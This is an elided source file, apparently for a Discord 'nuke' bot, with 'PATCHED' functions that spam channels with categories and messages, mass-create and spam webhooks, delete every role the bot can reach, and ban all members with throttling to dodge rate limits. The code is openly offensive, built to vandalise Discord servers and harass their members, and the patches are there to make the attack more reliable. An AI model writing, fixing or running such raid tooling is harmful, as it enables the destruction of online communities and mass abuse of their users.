...
# ─── PATCHED setUp: silent load of default.json ──────────────
def setUp():
    ...
    if config_path.is_file():
        try:
            ...
            print(f'[✘] Invalid JSON in {config_path} – falling back to interactive.')
            config = None

    if config is not None:
        settings.update(config)
        # Ensure bomb_messages.fixed exists (builder may leave it empty)
        if not settings.get('bomb_messages', {}).get('fixed'):
            settings['bomb_messages'] = settings.get('bomb_messages', {})
            settings['bomb_messages']['fixed'] = ['nuked', 'rekt', 'bozo']
        # Ensure webhook_spam fields exist
        if 'webhook_spam' not in settings:
            settings['webhook_spam'] = {}
        for key in ['usernames', 'pfp_urls', 'contents']:
            if key not in settings['webhook_spam']:
...
# ─── PATCHED fixedChoice with fallback ────────────────────────
def fixedChoice():
    fixed = settings['bomb_messages'].get('fixed', [])
    if not fixed:
...
async def addEmoji(ctx, item, *, name=None, bits=None):
    if not await hasTarget(ctx):
        return
    if bits is None:
        if item.startswith(('https://', 'http://', 'ftp://', 'ftps://')):
            try:
                if name is None:
...
async def deleteEmoji(ctx, *, name):
    ...
    if emoji is None:
        await log(ctx, f'Unable to find emoji `{name}`.')
        return
    try:
...
async def categoryBomb(ctx, n, method):
    ...
    if method == 'fixed':
        ...
        await log(ctx, f'Unable to find choice "{method}".')
        return
    consoleLog('Category bombing has started.', True)
    for i in range(n):
        payload = {
            'type': 4,
            'name': method(),
...
async def webhook(ctx, *, args=None):
    ...
    if args is None or args.isdigit():
        if args is None:
            args = '1'
        try:
            await embed(ctx, args, 'Webhooks', await server.webhooks())
            return
        except:
            raise

    args = args.split()
    if args[0] == 'create' or args[0] == 'add':
        del args[0]
        if len(args) < 1:
        ...
        if count is not None and count <= 50:
            ...
            if count > len(text_channels):
                await log(ctx, f'This adding webhooks method can only distribute webhooks evenly and randomly throughout the text channels. You entered `{count}`, and there are only `{str(len(text_channels))}` text channel(s) in the server. If you don\'t want to add more text channels, you can use this command a few more times with a positive integer that is less than `{str(len(text_channels) + 1)}`.')
                return
            for i in range(count):
                payload = {'name': random_b64(10)}
                q.put((requests.post, f'https://discord.com/api/v8/channels/{text_channels.pop(randrange(len(text_channels))).id}/webhooks', headers, payload))
            q.join()
            await log(ctx, f'`{count}` webhooks has been created.')
        elif count is not None and count < 100000000:
            await log(ctx, f'The maximum webhooks that can be created every hour per server is 50. And you entered `{count}`.')
        else:
            for channel in channels:
                checked_channel = containing(server.text_channels, channel)
        ...
        name = args[1]
        webhook = containing(await server.webhooks(), name)
        if webhook is None:
        ...
        try:
            ...
            async def validate_webhook(wh):
                ...
                try:
                    ...
                    if resp.status_code in (200, 204):
                        ...
                        consoleLog(f'Dead webhook {wh.name} (ID {wh.id}) – status {resp.status_code}')
                        return False
                except Exception as e:
                    consoleLog(f'Webhook {wh.name} failed test: {e}')
                    return False

            if len(args) > 0 and args[0].lower() == 'all':
                for webhook in webhooks:
                    if await validate_webhook(webhook):
                ...
                for i in range(int(args[1])):
                    payload = {
                        ...
                        'avatar_url': str(choice(settings['webhook_spam']['pfp_urls']))
                    }
                ...
                count = int(args[0])
                for i in range(count):
                    wh = webhooks.pop(randrange(webhooks_length))
                    webhooks_length -= 1
                    if await validate_webhook(wh):
                ...
                for wh_name in args:
                    wh = containing(await selected_server.webhooks(), wh_name)
                    if wh is None:
                        await log(ctx, f'Unable to find webhook `{wh_name}`.')
                        continue
                    if await validate_webhook(wh):
                        webhook_targets.append(wh)
                        loaded_length += 1
            ...
            if args[0] != 'list' and args[0] != 'start' and args[0] != 'offload':
                await log(ctx, f'`{str(validated_count)}` live webhooks loaded into the target list (out of {loaded_length} attempted).')

        except Exception as e:
            consoleLog(f'Attack branch error: {e}')
            raise

    else:
        await log(ctx, f'Unable to find `{args[0]}` command in webhook scripts.')

######### Nukes – sequential with hierarchy skip ############
@commands.check(checkPerm)
...
# ─── PATCHED deleteAllRoles – skips @everyone and roles above bot ──
@commands.check(checkPerm)
...
async def deleteAllRoles(ctx):
    ...
    bot_top_role = selected_server.me.top_role
    for role in selected_server.roles:
        if role.name == '@everyone':
            consoleLog('Skipping @everyone role – cannot be deleted')
            continue
        if role.position >= bot_top_role.position:
            consoleLog(f'Skipping role {role.name} – higher or equal to bot\'s top role')
            continue
...
# ─── PATCHED banAll – throttled to avoid rate limits ──────────
@commands.check(checkPerm)
...
async def banAll(ctx):
    ...
    for member_ in selected_server.members:
        ...
        # Small delay between bans to avoid hitting rate limits
        time.sleep(0.1)
    q.join()
...
async def serverIcon(ctx, path=None):
    ...
    elif path.startswith(('https://', 'http://', 'ftp://', 'ftps://')):
        try:
